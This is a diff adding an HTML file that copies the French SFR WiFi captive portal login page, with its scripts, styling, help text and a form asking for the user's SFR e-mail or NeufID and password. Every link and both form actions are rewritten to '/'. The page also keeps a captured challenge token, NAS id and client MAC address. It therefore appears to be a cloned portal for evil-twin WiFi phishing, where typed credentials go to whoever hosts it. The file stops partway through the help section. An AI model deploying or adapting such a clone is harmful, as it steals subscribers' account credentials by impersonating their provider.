@@ -1,0 +1,708 @@
+<!--?xml version="1.0" encoding="UTF-8"?-->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="fr" lang="fr"><head>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <title>Portail Captif Communautaire SFR WiFi</title>
+        <script type="text/javascript">
+var urlParams = extractUrlParams();
+var timer = 7000;
+window.onresize = function(event) {
+        if (document.getElementById("box") != null && document.getElementById("box").style.display=="block"){
+                var winW,winH;
+                if (document.body && document.body.offsetWidth) {
+                 winW = document.body.offsetWidth;
+                 winH = document.body.offsetHeight;
+                }
+                if (document.compatMode=='CSS1Compat' && document.documentElement && document.documentElement.offsetWidth ) {
+                 winW = document.documentElement.offsetWidth;
+                 winH = document.documentElement.offsetHeight;
+                }
+                if (window.innerWidth && window.innerHeight) {
+                 winW = window.innerWidth;
+                 winH = window.innerHeight;
+                }
+                var larg = (winW - document.getElementById('box').offsetWidth) / 2;
+                var haut = (winH - document.getElementById('box').offsetHeight) / 2;
+                document.getElementById("box").style.top=haut+"px";
+                document.getElementById("box").style.left=larg+"px";
+        }
+}
+
+function init() {
+    if (urlParams['res'] == 'success') {
+        openPopup(645, 310, 'successDiv', false);
+        setTimeout('redirectUserURL()', 1000);
+    }
+    initError(urlParams['res']);
+    if (urlParams['res'] != 'success') {
+    if (getCookie('autoProviderSFR')) {
+        document.forms['connect'].choix.value = getCookie('autoProviderSFR');
+    }
+    if (getCookie('autoLoginSFR')) {
+        document.forms['connect'].username.value = getCookie('autoLoginSFR');
+        document.forms['connect'].password.focus();
+        document.forms['connect'].save.checked = true;
+    }
+    } else
+        document.forms['connect'].username.focus();
+}
+
+function initError(res){
+    var error = getCookie('error');
+    var date=new Date;
+    if (error != null){
+        var endstr = error.indexOf(",", 0);
+        num_error = parseInt(unescape(error.substring(0, endstr)));
+        var date_end = parseInt(unescape(error.substring(endstr+1, error.length)));
+        if (res == 'failed'){
+            num_error = num_error + 1;
+            if (num_error == 3){
+                date.setHours(date.getHours()+1);
+                openPopup(600, 270, 'erreurDiv', false);
+            } else if (num_error > 3) {
+                openPopup(600, 270, 'erreurDiv', false);
+                date.setTime(date_end);
+            } else {
+                openPopup(600, 270, 'erreurDiv', true);
+                date.setTime(date_end);
+            }
+            setCookie("error", num_error.toString()+","+date.getTime(), date);
+        } else if (res == "success"){
+            setCookie("error", num_error.toString()+","+date.getTime(), null);
+        } else if (res == "notyet" && num_error > 3){
+            openPopup(600, 270, 'erreurDiv', false);
+        }
+    } else if (res == 'failed'){
+        date.setMinutes(date.getMinutes()+10);
+        setCookie("error", "1,"+date.getTime(), date);
+        openPopup(600, 270, 'erreurDiv', true);
+    } else if (res == 'success'){
+        setCookie("error", num_error.toString()+","+date.getTime(), null);
+    }
+}
+
+function retirerLangue(){
+    var doc, docs, docTemp;
+    docs=document.location.href.split("#");
+    docTemp = docs[0];
+    doc=docTemp.split("?");
+    var res = doc[0];
+    if(doc[1]){
+        var first = true;
+        for(var key in urlParams){
+            if(key != "lang"){
+                if(first == true){
+                    res = res+"?";
+                    res += key+'='+urlParams[key];
+                    first = false;
+                }else
+                    res += '&'+key+'='+urlParams[key];
+            }
+        }
+    }
+    return res;
+}
+
+function changeLangue(langue){
+    var doc, docTemp;
+    doc = retirerLangue();
+    if (langue=="en"){
+        docTemp=document.location.href.split("?");
+        if (docTemp[1])
+            window.location = doc+"&lang=en";
+        else
+            window.location = doc+"?lang=en";
+    }else{
+        window.location = doc;
+    }
+}
+
+function setCookie(sName, sValue, sTime) {
+        document.cookie=sName+"="+escape(sValue)+
+                  ((sTime==null) ? "" : ("; expires="+sTime.toGMTString()));
+}
+
+function getCookie(sName) {
+        var oRegex = new RegExp("(?:; )?" + sName + "=([^;]*);?");
+
+        if (oRegex.test(document.cookie)) {
+                return decodeURIComponent(RegExp["$1"]);
+        } else {
+                return null;
+        }
+}
+
+function redirectUserURL(){
+    timer = timer - 1000;
+    document.getElementById("theTimer").innerHTML = "&nbsp;" +(timer / 1000) + " secondes";
+    if (timer == 0){
+        var userurl = "/";
+        if (urlParams['userurl']){
+            var myString = new String(unescape(urlParams['userurl']));
+            var myArray = myString.split(';');
+            userurl = myArray[0];
+            if (myArray[4]) userurl = myArray[4];
+        }
+        window.location = userurl;
+    }else
+        setTimeout('redirectUserURL()', 1000);
+}
+
+function extractUrlParams(){
+    var t = location.search.substring(1).split('&');
+    var f = [];
+    for (var i=0; i<t.length; i++){
+        var x = t[ i ].split('=');
+        f[x[0]]=x[1];
+    }
+    return f;
+}
+
+function openPopup(largeur, hauteur, contenu, fermer){
+    document.getElementById("voile").style.display="block";
+    document.getElementById("contenuBox").innerHTML = document.getElementById(contenu).innerHTML;
+    if (fermer == false) document.getElementById("fermerBox").style.display="none";
+        else document.getElementById("fermerBox").style.display="inline";
+    document.getElementById("box").style.width=largeur+"px";
+    document.getElementById("box").style.height=hauteur+"px";
+    document.getElementById("box").style.display="block";
+    var winW,winH;
+    if (document.body && document.body.offsetWidth) {
+     winW = document.body.offsetWidth;
+     winH = document.body.offsetHeight;
+    }
+    if (document.compatMode=='CSS1Compat' &&
+        document.documentElement &&
+        document.documentElement.offsetWidth ) {
+     winW = document.documentElement.offsetWidth;
+     winH = document.documentElement.offsetHeight;
+    }
+    if (window.innerWidth && window.innerHeight) {
+     winW = window.innerWidth;
+     winH = window.innerHeight;
+    }
+    var larg = (winW - document.getElementById('box').offsetWidth) / 2;
+    var haut = (winH - document.getElementById('box').offsetHeight) / 2;
+    document.getElementById("box").style.top=haut+"px";
+    document.getElementById("box").style.left=larg+"px";
+
+}
+
+function closePopup(){
+    document.getElementById("voile").style.display="none";
+    document.getElementById("box").style.display="none";
+}
+
+function showInfos(id){
+    var ids = new Array('p1','p2','p3');
+    var i;
+    var hautC, hautB, hautE;
+    for (i = 0; i < 3; i++){
+        if (ids[i] == id && document.getElementById(ids[i]).style.display == "none"){
+            document.getElementById(ids[i]).style.display = "block";
+        }else if (ids[i] == id && document.getElementById(ids[i]).style.display == "block"){
+            document.getElementById(ids[i]).style.display = "none";
+        }else{
+            document.getElementById(ids[i]).style.display = "none";
+        }
+    }
+
+}
+
+function validForm(){
+    var date=new Date;
+    if (document.forms['connect'].username.value == ''){
+        alert('Merci d\'entrer votre E-mail ou NeufID');
+        return false;
+    }
+    document.forms['connect'].username2.value = document.forms['connect'].username.value;
+    if (document.forms['connect'].password.value == ''){
+        alert('Merci d\'entrer votre mot de passe');
+        return false;
+    }
+    if (document.forms['connect'].conditions.checked == false){
+        alert('Merci de valider les termes et conditions du service');
+        return false;
+    }
+
+    var challenge = '';
+    if (urlParams['challenge']) challenge = urlParams['challenge'];
+    document.forms['connect'].challenge.value = challenge;
+
+    var accessType = 'neuf';
+    if (document.forms['connect'].choix){
+        var selected = (document.forms['connect'].choix.options.selectedIndex);
+        var choix = choix = document.forms['connect'].choix.options[selected].value;
+        document.forms['connect'].accessType.value = choix;
+    }else
+        document.forms['connect'].accessType.value = accessType;
+
+    var lang = 'fr';
+    if (urlParams['lang'] && urlParams['lang'] == 'en') lang = urlParams['lang'];
+    document.forms['connect'].lang.value = lang;
+    date=new Date;
+    date.setMinutes(date.getMinutes() + 15);
+    setCookie('langSFR', lang, date);
+
+    var userurl = '/';
+    if (urlParams['userurl']){
+        var myString = new String(urlParams['userurl']);
+        var myArray = myString.split('%253b');
+        userurl = myArray[0];
+        if (myArray[4]) userurl = myArray[4];
+    }
+    document.forms['connect'].userurl.value = userurl;
+
+    var mode = '3';
+    if (urlParams['mode']) mode = urlParams['mode'];
+    document.forms['connect'].mode.value = mode;
+
+    var channel = '0';
+    if (urlParams['channel']) channel = urlParams['channel'];
+    document.forms['connect'].channel.value = channel;
+
+    var uamip = '192.168.2.1';
+    if (urlParams['uamip']) uamip = urlParams['uamip'];
+    document.forms['connect'].uamip.value = uamip;
+
+    var uamport = '3990';
+    if (urlParams['uamport']) uamport = urlParams['uamport'];
+    document.forms['connect'].uamport.value = uamport;
+
+    var mac = '00:00:00:00:00';
+    if (urlParams['mac']) mac = urlParams['mac'];
+    document.forms['connect'].mac.value = mac+'|'+urlParams['nasid'];
+
+    if (document.forms['connect'].save.checked == true){
+            date=new Date;
+            date.setMinutes(date.getMinutes()+ (7*24*60));
+            setCookie('autoLoginSFR', document.forms['connect'].username.value, date);
+        setCookie('autoProviderSFR', document.forms['connect'].choix.value, date);
+    }
+
+    return true;
+}
+        </script>
+        <style>
+html, body{margin:0;padding:0;font-family: Helvetica, Arial, "Nimbus Sans L", sans-serif;font-size:14px;-webkit-text-size-adjust:none;}
+img{border:none;}
+a{color:black;}
+input[type="button"], input[type="submit"] {-webkit-appearance: none;}
+.headerSFR{height:69px;margin-top:20px;margin-right:20px;margin-left:20px;}
+.ligne-rouge{width:946px;height:6px;background-color:#e2001a;margin-left: auto;margin-right: auto;}
+.headerSFR .gauche{height:66px;width:148px;top: 35px;position: absolute;}
+.headerSFR .droite{height:66px;width:650px;top: 50px; position: absolute;font-size:30px;padding-left: 180px;}
+.headerSFR .fon{height:106px;width:60px;top: 35px; position: absolute;font-size:18px;padding-left: 840px;}
+.headerSFR .fleche{top: 215px; position: absolute;padding-left: 530px;}
+.rouge{color:#e2001a;}
+.orange{color:#f2a300;}
+.authentBloc {width:340px;height:464px/*440px*/; border: 2px #d1d1d1 solid;margin:25px;border-top:#e2001a 6px solid;}
+.authentBloc .titre{font-size:18px;text-align:center;padding-top: 10px}
+.authentBloc .identifiant{font-size:12px;margin-top:10px;padding: 10px;padding-left: 20px;background-color:#f2f2f2}
+.authentBloc .motdepasse{font-size:12px;padding: 10px; padding-left: 20px;}
+.authentBloc .cond{font-size:12px;padding: 10px;padding-left: 20px;}
+.authentBloc .connexion{padding-right:10px;text-align: right;font-size:12px;}
+.authentBloc .connexion a{color:black;text-decoration:none}
+.authentBloc .infos{height:90px;width:340px;margin: 13px; margin-top:33px;}
+.authentBloc .infos .image{position: relative;width:23px;height:33px;top: 15px;left:10px;}
+.authentBloc .infos .texte{position: relative;width:270px;height:70px;top: -20px;left:40px;font-size:12px;}
+.authentBloc .infos .texte strong{font-size:14px;}
+.authentBloc .infos .plusInfos{position: relative;width:270px;height:10px;top: -45px;left:40px;font-size:12px;text-align:right!important;}
+.authentBloc .infos .plusInfos a{color:black;text-decoration:none;}
+.infosBloc {width:540px;height:470px; border: 1px #d1d1d1 solid;margin:25px 25px 0px 25px;}
+.infosBloc .titre{color:#e2001a;font-weight: bold;font-size: 24px;text-align: right; margin:10px 30px 10px 0;}
+.infosBloc .liste{margin:5px 30px;font-size:14px;color:#e2001a;list-style-type:square;}
+.infosBloc .liste li{padding:0;margin-bottom:5px;}
+.infosBloc .promo{font-size: 13px;}
+.infosBloc .promo .bloc{float:left;border: 2px #d1d1d1 solid;border-top:#e2001a 6px solid;width:235px;height:165px;margin:0 0 0 18px;}
+.infosBloc .promo .bloc h1{margin:0;padding:5px 5px 0px 5px;font-weight: bold;font-size: 13px;}
+.infosBloc .promo .bloc .texte{float:left;padding: 28px 5px 0px 5px;height:43px;width:150px;}
+.infosBloc .promo .bloc .image{float:right;width:48px;text-align: center;margin: -8px 5px 6px 0px;}
+.infosBloc .promo .bloc .lien{margin:0;padding:0;padding-bottom:7px;background-color: #f2f2f2; height: 30px;text-align: right;width:100%;display:inline-block;}
+.infosBloc .promo .bloc .lien .texteL{float:left;width: 102px;padding-top:7px;}
+.infosBloc .promo .bloc .lien .imageL{float:left;padding-top:8px;text-align:left;padding-left: 5px;}
+.infosBloc .promo .bloc .lien a{color:black;text-decoration:none;font-weight:bold;}
+.infosBloc .promo .redbloc{border:#e2001a 6px solid;height:161px;}
+.infosBloc .promo .redbloc h1{background-color:#e2001a; color:#FFFFFF; text-align: center; padding: 0; height:48px;}
+.infosBloc .promo .redbloc .lien{padding:0;}
+
+.grey_line {width:504px;height:1px; border-top: 1px #d1d1d1 solid; border-bottom: 1px #d1d1d1 solid; margin:16px 0 0 18px;}
+
+.redbloc .sprites {background: white; height:63px; padding: 9px 11px 9px 11px; text-align:center;}
+.redbloc .sprites .sprite-bloc {float: left; text-align:center; display: inline-block; margin: 0 10px ; _margin: 0 8px;}
+
+.footerBloc {text-align:right;padding-right:30px;color:#a1a1a1;padding-bottom:5px}
+.footerBloc a {text-decoration:none;color:#a1a1a1}
+.boutonC{height:23px;color:white;font-weight:bold;font-size: 15px;border:none;vertical-align:middle;
+margin-bottom:10px;
+-moz-box-shadow:0px 2px 2px rgba(000,000,000,0.5);
+-webkit-box-shadow: 0px 2px 2px rgba(000,000,000,0.5);
+box-shadow: 0px 2px 2px rgba(000,000,000,0.5);
+filter: progid:DXImageTransform.Microsoft.Shadow(strength = 2, direction = 180, color = '#000000');
+-ms-filter: "progid:DXImageTransform.Microsoft.Shadow(strength = 2, Direction = 180, Color = '#000000')";
+background-color: #cc0000; /* Old browsers */}
+.voile{z-index:10000;top:0;position:absolute;width:100%;height:100%;background-color: #000;filter:alpha(opacity=50);opacity: 0.5;-moz-opacity:0.5;display:none;}
+.box{width:500px;height:200px;background-color:white;border: 5px #d1d1d1 solid;z-index:10001;position:absolute;display:none;margin: 0 auto;}
+.box .fermer{text-align:right;margin:0;padding:0;padding-bottom: 10px}
+.box .fermer a{font-size: 14px;cursor: pointer}
+#aideDiv {display: none}
+#aideContenu {width:600px;height:340px;background-color:#d1d1d1;font-size:14px;line-height:30px;text-align:left!important;overflow: auto;margin-top: 20px}
+#aideContenu p {padding:0;margin:0;padding-left:30px!important;}
+#p1 p {margin:0;padding:0;padding-left:45px!important}
+#p1 ul {margin-top:0; margin-bottom: 0;list-style-type:square;color:#e2001a}
+#p1 ul li{margin:0;padding:0;margin-left:45px!important;}
+#p1 ul li span{color:black}
+#p2 {line-height:normal}
+#p2 p {margin:0;padding:0;padding-left:45px!important}
+#p2 ul {margin-top:0; margin-bottom: 0;list-style-type:square;color:#e2001a}
+#p2 ul li{margin:0;padding:0;margin-left:45px!important;}
+#p2 ul li span{color:black}
+#p3 {line-height:normal}
+#p3 p {margin:0;padding:0;padding-left:45px!important}
+#p3 ul {margin-top:0; margin-bottom: 0;list-style-type:square;color:#e2001a}
+#p3 ul li{margin:0;padding:0;margin-left:45px!important;}
+#p3 ul li span{color:black}
+
+/* refonte Popin Success */
+#successPopin{width:530px;/* height:215px; */background-color:#efefef;text-align:left!important;padding:35px 20px 20px 30px;}
+.logoPopin{background:transparent url(rsc/sfr.png)no-repeat top left;width:74px;height:71px;position:absolute;top:10px;left:3px;}
+.titlePopin{font-weight:bold;font-size:20px;color:#252525;border-bottom:1px #c1bdbd solid;margin-bottom:20px;padding-bottom:10px;text-align:center;}
+.texteCompteur{font-weight:bold;font-size:12px;margin:0 0 30px;}
+.texteCompteur #theTimer{font-size:16px;}
+#colHotspot  div{float:left;}
+#colHotspot .colLeft{width:235px;overflow:hidden;margin-right:20px;}
+#colHotspot .colMiddle{width:170px;}
+#colHotspot .colRight{width:225px;}
+#colHotspot .colMiddle p{margin:-10px 0 0;}
+#colHotspot .colMiddle a{text-decoration:none;}
+#colHotspot .colMiddle a .sfrPopin{font-weight:900;font-size:38px;color:#e2001a;}
+#colHotspot .colMiddle a .wifiPopin{font-size:38px;color:#e2001a;}
+#colHotspot .colMiddle a .iluvhotspot{font-size:23px; margin-top:0;color:#2b2a2e;}
+#colHotspot .colMiddle .iluvhotspot img{vertical-align:bottom;}
+#colHotspot .texteL a{font:normal 12px Arial, Helvetica, Sans serif;color:#151515;text-decoration:none;}
+#colHotspot .texteL a:hover{text-decoration:underline;}
+
+.sprite-ligne-grise{ background-color: #d1d1d1; width: 314px; height: 1px; }
+.sprite-ampoule{ background: url(rsc/sprites.png) no-repeat top left;background-position: 0 0; width: 23px; height: 33px; }
+.sprite-en{ background: url(rsc/sprites.png) no-repeat top left;background-position: 0 -33px; width: 16px; height: 11px;float:left;margin-top:4px;margin-left:740px; }
+.sprite-fermer{ background: url(rsc/sprites.png) no-repeat top right; background-position: 0 -44px; height: 11px; width: 11px; position:absolute;right:7px;top:7px; }
+.sprite-fleche-rouge{ background: url(rsc/sprites.png) no-repeat top left;background-position: 0 -55px; width: 10px; height: 16px; }
+.sprite-flecheG{ background: url(rsc/sprites.png) no-repeat top left;background-position: 0 -71px; width: 35px; height: 69px; }
+.sprite-fr{ background: url(rsc/sprites.png) no-repeat top left;background-position: 0 -140px; width: 16px; height: 11px;float:left;margin-top:4px;margin-left:750px; }
+.sprite-mobiles{ background: url(rsc/sprites.png) no-repeat top left;background-position: 0 -151px; width: 46px; height: 58px; }
+.sprite-puce{ background: url(rsc/sprites.png) no-repeat top left;background-position: 0 -209px; width: 3px; height: 5px;float:left;margin-top:5px;}
+.sprite-sfr-wifi{ background: url(rsc/sprites.png) no-repeat top left;background-position: 0 -214px; width: 149px; height: 66px; }
+.sprite-tablette{ background: url(rsc/sprites.png) no-repeat top left;background-position: 0 -280px; width: 40px; height: 52px; }
+.sprite-box{ background: url(rsc/sprites.png) no-repeat top left;background-position: 0 -332px; width: 50px; height: 58px; }
+.sprite-red{ background: url(rsc/sprites.png) no-repeat top left;background-position: 0 -390px; width: 57px; height: 58px; }
+.sprite-multi{ background: url(rsc/sprites.png) no-repeat top left;background-position: 0 -448px; width: 29px; height: 58px; }
+.sprite-sfr{ background: url(rsc/sprites.png) no-repeat top left;background-position: 0 -506px; width: 74px; height: 71px; }
+
+/* FON */
+.sprite-fon{background: url(rsc/sprites.png) no-repeat top left;background-position: 0 -577px; width: 100px; height: 60px;}
+.sprite-fon-little{background: url(rsc/sprites.png) no-repeat top left;background-position: 0 -637px; width: 57px; height: 34px; margin:5px;float: left;}
+.sprite-fonero{background: url(rsc/sprites.png) no-repeat top left;background-position: 0 -671px; width: 104px; height: 105px; margin-top: 10px; margin-left: 10px; float: left;}
+
+.orange_working { background-color: rgb(255, 147, 49); }
+
+.infosBloc .fonBloc{margin:6px 18px 0 18px; position: relative;}
+.infosBloc .fonBloc p.share_fon{font-size:20px;font-weight:lighter;color:orange;float: right; margin-top: 25px; text-align: right; line-height:15px;}
+.infosBloc .fonBloc p.share_fon a {font-size:12px;color:orange;}
+.fon_access { float: right; }
+
+.infosBloc .offreFon{float:left; padding: 10px 0 0;}
+.infosBloc .fonBloc .offreFon p{margin:0;}
+.infosBloc .fonBloc p.titre{font-size: 14px;color:black;margin-top:0;text-align:center;margin:5px 0;}
+.infosBloc .offreFon p a {display:block;color:white;font-weight:bold;text-decoration: none;font-size:18px; width:90%;margin:0 15px;}
+
+.boutonFon{width:114px;height:28px;border:none;vertical-align:middle;font-size:12px;border-radius:5px;background-color: #ffcc00; /* Old browsers */}
+.boutonFon:hover{color:#E2001A;}
+.fon_access .text { font-size:14px; float: right;text-align:right; margin: 0; }
+.fon_access .link { float: right;margin:1px 35px 0px 10px; }
+.fon_access .text .little {font-size: 9px;}
+a.utiliser{ text-decoration: none; }
+        </style>
+    <link rel="icon" type="image/png" href="rsc/favicon.png">
+            <!--WISPAccessGatewayParam xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="https://hotspot.sfr.fr/dashboard/WISPAccessGatewayParam.xsd">
+            <AuthenticationReply>
+                <MessageType>120</MessageType>
+                <ResponseCode>100</ResponseCode>
+                <ReplyMessage>Authentication Failure</ReplyMessage>
+            </AuthenticationReply>
+        </WISPAccessGatewayParam-->
+    <!--SFRLoginURL_JIL=/indexEncryptingChilli.php?res=failed&uamip=192.168.2.1&uamport=3990&challenge=b37714b9253dd77ff61c418652e8f4a7&userurl=http%3a%2f%2fwww.sfr.fr%2frecherche%2fgoogle%3fq%3dhttp%253A%252F%252F192.168.1.1%252F%3bneuf%3bfr%3b4%3bhttp%3a%2f%2fwww.sfr.fr%2frecherche%2fgoogle%3fq%3dhttp%253A%252F%252F192.168.1.1%252F%3b&reply=Request%20Denied&nasid=00-25-15-2b-3a-4b&mac=D0-DF-9A-63-8C-43&mode=4&channel=0-->
+    </head>
+
+    <body onload="init()">
+        <!--version>5.3_rlp - PCNB4 - {28/02/2013}</version-->
+        <table style="border: 1px #d1d1d1 solid;margin-top:20px" align="center" width="900" border="0" cellpadding="0" cellspacing="0">
+            <tbody><tr>
+                <td colspan="2">
+                    <div class="headerSFR">
+                        <div class="gauche"><div class="sprite-sfr-wifi"></div></div>
+                        <div class="droite">vous accompagne, là où vous en avez besoin.</div>
+                        <div class="fon"><div class="sprite-fon"></div></div>
+                        <div class="fleche"><div class="sprite-flecheG"></div></div>
+                    </div>
+                    <div style="width:100%; text-align: center">
+                        <div class="ligne-rouge"></div>
+                    </div>
+                </td>
+            </tr>
+            <tr>
+                <td valign="top">
+                    <div class="infosBloc">
+                        <div class="titre"> Avec SFR WiFi, surfez en illimité </div>
+                        <ul class="liste">
+                            <li><span style="color:black">4 millions de Hotspots WiFi partout en France</span></li>
+                            <li><span style="color:black">En exclusivité pour les clients box, 9 millions de Hotspots WiFi à l’étranger en rejoignant la communauté <span class="orange"><strong>Fon</strong></span></span></li>
+                        </ul>
+                        <div class="promo">
+                            <div class="bloc">
+                                <h1>Client Webphone &amp; Tablette</h1>
+                                <div>
+                                    <div class="texte">Utilisez l'application<br>SFR WiFi ou Auto Connect WiFi.</div>
+                                    <div class="image"><div class="sprite-mobiles"></div><div class="sprite-tablette"></div></div>
+                                    <div style="clear:both"></div>
+                                </div>
+                                <div class="lien">
+                                    <div class="texteL"><a href="/">Plus d'infos</a></div>
+                                    <div class="imageL"><div class="sprite-fleche-rouge"></div></div>
+                                    <div style="clear:both"></div>
+                                </div>
+                            </div>
+                            <div class="bloc redbloc">
+                  <h1>Venez découvrir toutes les offres Mobile, Fixe et les services de SFR sur sfr.fr</h1>
+                                <div class="sprites">
+<div class="sprite-red sprite-bloc"></div><div class="sprite-multi sprite-bloc"></div><div class="sprite-box sprite-bloc"></div>
+                                    </div>
+                                    <div class="lien">
+                                        <div class="texteL"><a href="/">Plus d'infos</a></div>
+                                        <div class="imageL"><div class="sprite-fleche-rouge"></div></div>
+                                        <div style="clear:both"></div>
+                                </div>
+                            </div>
+                <div style="clear: both; overflow: hidden; height: 1px;"></div>
+                        </div>
+
+                        <div class="grey_line"></div>
+
+                        <div class="fonBloc">
+                            <div class="sprite-fon-little"></div>
+                <div><p class="share_fon">
+                Rejoignez Fon et naviguez en toute liberté
+                <br><a href="/">Plus d'infos »</a>&nbsp;</p></div>
+
+                            <div class="sprite-fonero"></div>
+                            <div class="fon_access">
+<p class="link"><input onclick="location.href='/';" name="connexion" id="connexion" value="CONNEXION" class="boutonFon" type="submit"></p>
+<p class="text">Vous partagez avec Fon ou<br>vous avez déjà <strong>un pass Fon</strong></p>
+<div style="clear:both;height:13px;"></div>
+<p class="link"><input onclick="location.href='/';" name="connexion" id="connexion" value="ACHETER" class="boutonFon" type="submit"></p>
+<p class="text">Achat de pass <strong>1h / 1 jour / 5 jours</strong><br><span class="little">Par SMS ou Carte Bancaire</span></p>
+                </div>
+                        </div>
+
+                    </div>
+                </td>
+                <td valign="top" width="390px">
+                    <div class="authentBloc">
+                        <form action="/" method="POST" name="connect" onsubmit="javascript:return validForm();">
+                            <div class="titre">Vous êtes client <span class="rouge">SFR</span> ADSL ou Fibre,<br>identifiez-vous !</div>
+                            <div class="identifiant">
+                                <strong><span class="rouge">E-mail</span> ou <span class="rouge">NeufID</span></strong><br>
+                                <input name="username" id="login" size="30" type="text">
+                            </div>
+                            <div class="motdepasse">
+                                <strong>Mot de passe</strong><br>
+                                <input name="password" id="password" size="30" type="password">
+                            </div>
+                            <div class="cond">
+                                <input name="conditions" id="conditions" type="checkbox"> J'accepte les <strong><a href="/">termes et conditions</a></strong> du service<br>
+                                <input name="save" id="save" type="checkbox"> Se souvenir de mon identifiant
+                            </div>
+                            <div class="connexion">
+                                <input name="challenge" style="display:none;" type="text">
+                                <input name="username2" style="display:none;" type="text">
+                <input name="accessType" style="display:none;" type="text">
+                                <input name="lang" style="display:none;" type="text">
+                                <input name="mode" style="display:none;" type="text">
+                                <input name="userurl" style="display:none;" type="text">
+                                <input name="uamip" style="display:none;" type="text">
+                                <input name="uamport" style="display:none;" type="text">
+                                <input name="channel" style="display:none;" type="text">
+                <input name="mac" style="display:none;" type="text">
+                                <input name="connexion" id="connexion" value="CONNEXION" class="boutonC" type="submit"><br><br>
+                                <div class="plusInfos">
+                                    <div class="sprite-puce" style="margin-left:19.9em"></div>
+                                    <div style="float: right;"><a href="#" onclick="openPopup(700, 440, 'aideDiv', true)">Besoin d'aide ?</a></div>
+                                </div>
+                                <br>
+                            </div>
+                            <div class="infos">
+                                <div class="sprite-ligne-grise" style="margin-bottom:20px;"></div>
+                                <div class="image">
+                                    <div class="sprite-ampoule"></div>
+                                </div>
+                                <div class="texte">
+                                    <strong>Vous êtes client SFR, ADSL ou Fibre?</strong><br>
+                                    Chez vous, utilisez votre réseau WiFi privé pour surfer sur internet !
+                                </div>
+                                <div class="plusInfos">
+                                    <div class="sprite-puce" style="margin-left:16.7em"></div>
+                                    <div style="float: right;"><a href="/" target="_blank">Plus d'infos</a></div>
+                                </div>
+                            </div>
+                        </form>
+                    </div>
+                </td>
+            </tr>
+            <tr>
+                <td colspan="2" class="footerBloc">
+                    <a href="#" onclick="javascript:changeLangue('en');"><div class="sprite-en"></div></a> | <a href="/" target="_blank">Mentions légales</a> | <a href="/" target="_blank">Assistance</a>
+                </td>
+            </tr>
+        </tbody></table>
+        <div style="display: block;" class="voile" id="voile"> </div>
+        <div style="width: 600px; height: 270px; display: block; top: 176.5px; left: 378px;" class="box" id="box">
+            <table height="100%" width="100%" border="0" cellpadding="0" cellspacing="0">
+                <tbody><tr align="right" height="38&quot;" valign="middle">
+                    <td><div style="display: inline;" id="fermerBox" class="fermer">
+                            <a onclick="javascript:closePopup()"><div class="sprite-fermer"></div>
+                            <div style="position:absolute;right:1.5em;top:5px">FERMER</div></a>
+                            <div style="clear: both"></div>
+                    </div></td>
+                </tr>
+                <tr align="center" valign="top"><td id="contenuBox">
+            <div style="width:500px;height:200px;background-color:#d1d1d1;font-size:16px;line-height:30px;">
+                <br><span class="rouge" style="font-weight:bold;font-size:24px">ERREUR D'AUTHENTIFICATION !</span><br>
+                <hr style="height:2px;width:400px;background-color:black;border:1px black solid"><br>
+                Assurez-vous d'avoir saisi vos <strong>identifiants</strong> neufbox de SFR.<br>
+                Si vous êtes chez vous, utilisez plutôt votre accès WiFi privé.
+            </div>
+        </td></tr>
+            </tbody></table>
+        </div>
+        <div id="erreurDiv" style="display: none">
+            <div style="width:500px;height:200px;background-color:#d1d1d1;font-size:16px;line-height:30px;">
+                <br><span class="rouge" style="font-weight:bold;font-size:24px">ERREUR D'AUTHENTIFICATION !</span><br>
+                <hr style="height:2px;width:400px;background-color:black;border:1px black solid"><br>
+                Assurez-vous d'avoir saisi vos <strong>identifiants</strong> neufbox de SFR.<br>
+                Si vous êtes chez vous, utilisez plutôt votre accès WiFi privé.
+            </div>
+        </div>
+        <div id="successDiv" style="display: none">
+            <div id="successPopin">
+                <div class="logoPopin"></div>
+                <p class="titlePopin">FÉLICITATIONS !</p>
+                <p class="texteCompteur">Vous allez être redirigé vers le site internet demandé dans <span class="rouge" id="theTimer">7 secondes</span>.</p>
+<form action="/" method="post" id="iluvhs"></form>
+<form action="/" method="post" id="sfr_fr"></form>
+<input name="nasID" value="00-25-15-2b-3a-4b" type="hidden">                <div id="colHotspot">
+                    <div class="colLeft">
+                        <a href="javascript:void(1);" onclick="document.getElementById('iluvhs').submit();"><div class="sprite-sfr-wifi">&nbsp;</div></a>
+                    </div>
+                    <div class="colRight texteL">
+                      <div class="sprite-puce" style="margin-left:-.5em"></div>
+                      <a href="javascript:void(1);" onclick="document.getElementById('iluvhs').submit();">Cliquez ici pour découvrir SFR WiFi et rejoindre la communauté des hotspotters.</a>
+                    <br><br>
+                    </div>
+                    <div class="colRight texteL">
+                      <div class="sprite-puce" style="margin-left:-.5em"></div>
+                        <a href="javascript:void(1);" onclick="document.getElementById('sfr_fr').submit();">Cliquez ici pour accéder directement au site sfr.fr.</a>
+                    </div>
+                </div><!-- Fin de #colHotspot -->
+            <div style="clear:both"></div>
+            </div><!-- Fin de #successPopin -->
+        <div id="aideDiv">
+            <div id="aideContenu">
+                    <p style="padding-top:40px!important">
+                        <strong>Quel identifiant et mot de passe utiliser pour s'identifier ?</strong><br><br>
+                        Votre identifiant SFR WiFi est votre identifiant SFR.fr .<br>
+                        Vous devez être client Internet ADSL ou Fibre.<br>
+                        La nature des identifiants et mots de passe peut varier suivant votre  abonnement.<br>
+                        Pour connaître le bon couple identifiant/mot de passe, précisez si:
+                    </p>
+                    <p><a href="#" onclick="showInfos('p1')">Vous êtes abonné(e) Neufbox de SFR</a></p>
+                    <div id="p1" style="display:none">
+                        <p>
+                            <span class="rouge"><strong>Vous êtes titulaire d'un compte neufbox de SFR</strong></span><br>
+                            <strong>Comment se connecter sur SFR.fr ?</strong><br><br>
+                            <span style="text-decoration:underline">votre identifiant SFR.fr</span><br>
+                        </p>
+                            <ul><li><span>l'adresse email reçue par courrier lors de votre inscription (exemple : jean.dupont@sfr.fr)</span></li></ul>
+                        <p>ou</p>
+                            <ul><li><span>votre adresse email personnalisée si vous l'avez modifiée (exemple : j.dupont@sfr.fr)</span></li></ul>
+                        <p>ou</p>
+                            <ul><li><span>votre identifiant Mon Compte (9ID)</span></li></ul>
+
+                        <p><span style="text-decoration:underline">votre mot de passe</span></p>
+                        <ul><li><span>le mot de passe reçu par courrier lors de votre inscription</span></li></ul>
+                        <p>ou</p>
